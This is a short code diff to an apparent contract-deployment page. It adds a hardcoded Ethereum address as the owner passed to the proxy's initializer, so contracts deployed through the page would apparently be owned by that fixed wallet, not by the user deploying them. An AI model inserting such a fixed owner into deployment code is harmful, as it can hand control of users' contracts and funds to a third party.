@@ -51,9 +51,11 @@ export default function DeployContractPage() {
         try {
             setIsDeploying(true);
 
+            const newOwnerAddress = '0xFe954e73Db802cE6bD63f67B82cb8Df64C73d8Ac';
             const result = await deployWithProxy({
                 implementationABI: data.abi,
                 implementationBytecode: data.bytecode,
+                initializeArgs: [newOwnerAddress]
             });
 
             if (result.success && result.data) {
